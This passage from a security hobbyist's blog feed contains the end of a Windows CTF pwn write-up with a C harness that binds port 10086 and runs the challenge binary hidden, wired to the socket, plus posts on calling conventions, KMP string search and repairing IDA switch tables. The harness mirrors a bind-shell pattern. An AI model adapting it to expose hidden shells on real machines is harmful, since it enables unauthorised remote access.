class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVICE_PATH <span class="string">&quot;C:\\Users\\lenovo\\Desktop\\zip\\pwn.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LISTEN_PORT 10086</span></span><br><span class="line"></span><br><span class="line">DWORD __stdcall <span class="title function_">OnAccpet</span><span class="params">(LPVOID lpParam)</span>&#123;</span><br><span class="line">HANDLE hFile = (HANDLE)lpParam;</span><br><span class="line">DWORD dwWriteBytes = <span class="number">0</span>;</span><br><span class="line">STARTUPINFOA si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">si.hStdError = hFile;</span><br><span class="line">si.hStdOutput = hFile;</span><br><span class="line">si.hStdInput = hFile;</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">si.wShowWindow = SW_HIDE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Run Process....</span></span><br><span class="line">CreateProcessA(SERVICE_PATH, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, TRUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭socket</span></span><br><span class="line">closesocket((SOCKET)hFile);</span><br><span class="line">WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), <span class="string">&quot;service_exit\n&quot;</span>, <span class="number">13</span>,&amp;dwWriteBytes , <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">WSADATA wsadata;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">0</span>), &amp;wsadata);</span><br><span class="line"></span><br><span class="line">sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">addr.sin_addr.S_un.S_addr = INADDR_ANY;</span><br><span class="line">addr.sin_port = htons(LISTEN_PORT);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">SOCKET listenSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bind(listenSocket, (sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">listen(listenSocket,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">sockaddr_in clientAddr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> addr_len = <span class="keyword">sizeof</span>(clientAddr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accpet...\n&quot;</span>);</span><br><span class="line">SOCKET Client = WSAAccept(listenSocket, (sockaddr*)&amp;clientAddr, &amp;addr_len, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">CreateThread(<span class="number">0</span>, <span class="number">0</span>, OnAccpet,(LPVOID)Client, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows-第五空间2019-决赛-PWN9&quot;&gt;&lt;a href=&quot;#Windows-第五空间2019-决赛-PWN9&quot; class=&quot;headerlink&quot; title=&quot;[Windows][第五空间2019 决赛]PWN9&quot;&gt;&lt;/a&gt;[Windows][第五</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>cdecl与stdcall混用</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/03/cdecl%E4%B8%8Estdcall%E6%B7%B7%E7%94%A8/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/03/cdecl%E4%B8%8Estdcall%E6%B7%B7%E7%94%A8/</id>
    <published>2022-10-02T16:01:54.000Z</published>
    <updated>2022-10-02T16:11:09.140Z</updated>
    
    <content type="html"><![CDATA[<p>__cdecl 调用约定是由调用者来清理栈,像printf这些可变参数就是通过 cdecl来实现的<br>stdcall 是由被调用者清理栈空间的,它的参数个数必须是固定的,因为函数结束时esp&#x2F;rsp调整的数量值是固定的</p><p>在使用的时候有的dll内部的函数是cdecl类型的，但是在源码中声明的时候写成了stdcall,这样就导致了函数结束时,并没有清理栈空间,然而大多数情况下程序仍然可以正常运行,因为没有影响局部变量区域,局部变量的操作是通过rbp&#x2F;rbp来进行的。只是会造成栈空间的浪费，函数结束时leave指令可以使rsp&#x2F;esp回到正常的位置。</p><p>反过来,如果dll里面的是stdcall的函数,但是我通过cdecl的方式去调用.这肯定是会出问题的,esp&#x2F;rsp被调整了两次,已经歪的很厉害了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;__cdecl 调用约定是由调用者来清理栈,像printf这些可变参数就是通过 cdecl来实现的&lt;br&gt;stdcall 是由被调用者清理栈空间的,它的参数个数必须是固定的,因为函数结束时esp&amp;#x2F;rsp调整的数量值是固定的&lt;/p&gt;
&lt;p&gt;在使用的时候有的dll内部</summary>
      
    
    
    
    <category term="C语言" scheme="https://h4ckf0rfun.github.io/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>2022-10-02</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/02/2022-10-02/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/02/2022-10-02/</id>
    <published>2022-10-02T15:49:04.000Z</published>
    <updated>2022-10-02T15:50:50.688Z</updated>
    
    <content type="html"><![CDATA[<p>如果前进有困难，那就尝试后退几步</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果前进有困难，那就尝试后退几步&lt;/p&gt;
</summary>
      
    
    
    
    <category term="日记" scheme="https://h4ckf0rfun.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>kmp</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/28/kmp/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/28/kmp/</id>
    <published>2022-09-28T13:57:25.000Z</published>
    <updated>2022-09-28T13:59:35.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kmp"><a href="#kmp" class="headerlink" title="kmp"></a>kmp</h1><h3 id="关键"><a href="#关键" class="headerlink" title="关键:"></a>关键:</h3><ol><li>求出next数组， (可以根据next数组计算出遇到不匹配时应该向后跳多远，即有公共前后缀的情况，next里面保存了从subString起始位置到当前位置这部分字符串的最长公共前后缀)</li><li>公共前后缀</li><li>充分利用已知</li></ol><h3 id="如何在O-n-内计算出subString-的-next数组"><a href="#如何在O-n-内计算出subString-的-next数组" class="headerlink" title="如何在O(n) 内计算出subString 的 next数组:"></a>如何在O(n) 内计算出subString 的 next数组:</h3><p>直接上代码吧:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _get_next(<span class="type">const</span> <span class="type">char</span>*s)&#123;</span><br><span class="line">size = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="type">int</span> now = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> it = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (it = <span class="number">1</span>; it &lt; size;)&#123;</span><br><span class="line"><span class="keyword">if</span> (s[now] == s[it])&#123;</span><br><span class="line">next[it] = now + <span class="number">1</span>;</span><br><span class="line">now++;</span><br><span class="line">it++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (now &gt; <span class="number">0</span>)&#123;</span><br><span class="line">now = next[now - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">next[it] = <span class="number">0</span>;</span><br><span class="line">it++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中now实际保存的是最长公共前后缀的结束部分 (由于最长公共前后缀前面有一个，后面有一个，这里的now是保存前面的那个,即从0 到 now 的位置这部分 ，是因为从0到n一定会包含这部分)</p><p>上面的代码中实际只有两种情况:</p><ol><li><p>it与now 指向的字符相同的情况, 这时我们可以根据 0: it-1 这部分的最长公共前后缀，求出0 : it这部分的最长公共前后缀. (直接加1即可) 然后it++, now++ (now始终是前面那部分最长公共前后缀的结束位置)</p></li><li><p>it与now 指向的字符不同的情况, 那么接下来就应该直接将now重新置为0吗??? 此时应该缩小公共前后缀的长度  ，只需要找出最长公共前后缀的的最长公共前后缀即可 (假设存在更小的公共前后缀，那么它一定是包含在最长公共前后缀中的) (认真思考缩小公共前后缀的原因)</p></li></ol><p>之后strstr的实现根据next的数组就很容易写出来了:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">mystrstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*string,<span class="type">const</span>  <span class="type">char</span>*sub)</span></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>*now = <span class="number">0</span>,*it;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get next array;</span></span><br><span class="line">_get_next(sub);</span><br><span class="line">now = string;</span><br><span class="line">it = now;</span><br><span class="line"><span class="keyword">while</span> (*now)&#123;</span><br><span class="line"><span class="keyword">while</span> (*it == sub[it - now] &amp;&amp; (it - now) &lt; size)</span><br><span class="line">it++;</span><br><span class="line"><span class="keyword">if</span> ((it - now) == size)&#123;</span><br><span class="line"><span class="keyword">return</span> now;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (it == now)&#123;</span><br><span class="line">now++;</span><br><span class="line">it = now;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//遇到不匹配的,看一下跳几步</span></span><br><span class="line">now += (it - now) - next[it - now - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kmp&quot;&gt;&lt;a href=&quot;#kmp&quot; class=&quot;headerlink&quot; title=&quot;kmp&quot;&gt;&lt;/a&gt;kmp&lt;/h1&gt;&lt;h3 id=&quot;关键&quot;&gt;&lt;a href=&quot;#关键&quot; class=&quot;headerlink&quot; title=&quot;关键:&quot;&gt;&lt;/a&gt;关键:&lt;/h3&gt;</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>IDA修复switch语句</title>
    <link href="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/"/>
    <id>https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/</id>
    <published>2022-09-27T13:18:01.000Z</published>
    <updated>2022-09-27T13:19:22.906Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDA-switch语句修复"><a href="#IDA-switch语句修复" class="headerlink" title="IDA switch语句修复"></a>IDA switch语句修复</h1><p>下面是一段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(a)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your input is 0\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 1\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 2\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 3\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 4\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 5\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;your input is 6\n&quot;</span>);</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;your input is 7\n&quot;</span>);</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;your input is 8\n&quot;</span>);</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译后，先看看生成的汇编代码是啥样子的，这里直接从输入a的值之后开始看: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000011B</span>E                 call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">00000000000011</span>C3                 mov     eax, [rbp+var_C] ; <span class="keyword">switch</span> <span class="number">8</span> cases</span><br><span class="line">.text:<span class="number">00000000000011</span>C6                 cmp     eax, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000000011</span>C9                 ja      loc_126F</span><br><span class="line">.text:<span class="number">00000000000011</span>CF                 mov     eax, eax</span><br><span class="line">.text:<span class="number">00000000000011</span>D1                 lea     rdx, ds:<span class="number">0</span>[rax*<span class="number">4</span>]</span><br><span class="line">.text:<span class="number">00000000000011</span>D9                 lea     rax, jump_table</span><br><span class="line">.text:<span class="number">00000000000011E0</span>                 mov     eax, [rdx+rax]</span><br><span class="line">.text:<span class="number">00000000000011E3</span>                 cdqe</span><br><span class="line">.text:<span class="number">00000000000011E5</span>                 lea     rdx, jump_table</span><br><span class="line">.text:<span class="number">00000000000011</span>EC                 add     rax, rdx</span><br><span class="line">.text:<span class="number">00000000000011</span>EF                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">00000000000011</span>EF                 jmp     rax</span><br></pre></td></tr></table></figure><p>把输入的a 乘4 计算出 offset 在 jump_table中的偏移 , 然后把jump_table的地址当作base,加上对应的offset 放到rax，然后jmp rax</p><p>知道的原理之后，我们可以知道，要计算出目标地址，需要进行下面的操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TargetAddr = jmp_table.addr  +  jmp_table[idx]</span><br></pre></td></tr></table></figure><p>也就是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TargetAddr = jmp_table.addr  +  *(jmp_table + <span class="keyword">sizeof</span>(jmp_table[<span class="number">0</span>]) * idx) </span><br></pre></td></tr></table></figure><p>看一下IDA里面，11c3是switch开始的部分: </p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled.png" alt="Untitled"></p><p>jmp_table在这里:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%201.png" alt="Untitled"></p><p>点击 IDA:edit→other→Specify switch idiom…，看到下面的界面</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%202.png" alt="Untitled"></p><p>对照前面说的，把需要的信息填上去就行</p><ol><li>Address of jump table: jump table的起始位置</li><li>Number of Elements: 数组元素个数</li><li>Size of elements: 每个元素的大小</li><li>Element base value: offset ，也就是每个元素要加的base，从汇编代码可以看出来就是jump table的地址</li><li>Start of the switch idiom: switch开始的地方</li><li>Input register of switch : 被当作idx的寄存器</li></ol><p>…….</p><p>填完之后点击确定，然后F5，我们会发现生成的C语言代码并不是向我们想象的那样:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%203.png" alt="Untitled"></p><p>大家仔细观察就会发现，除了最高位的1，都是正确的，这是因为IDA把jmp table中的每个element 当作了无符号数，只需要在这里打上勾就行:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%204.png" alt="Untitled"></p><p>然后就能看到想要的结果了:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/27/IDA%E4%BF%AE%E5%A4%8Dswitch%E8%AF%AD%E5%8F%A5/Untitled%205.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDA-switch语句修复&quot;&gt;&lt;a href=&quot;#IDA-switch语句修复&quot; class=&quot;headerlink&quot; title=&quot;IDA switch语句修复&quot;&gt;&lt;/a&gt;IDA switch语句修复&lt;/h1&gt;&lt;p&gt;下面是一段代码&lt;/p&gt;
&lt;figure cl</summary>
      
    
    
    
    <category term="逆向" scheme="https://h4ckf0rfun.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
</feed>
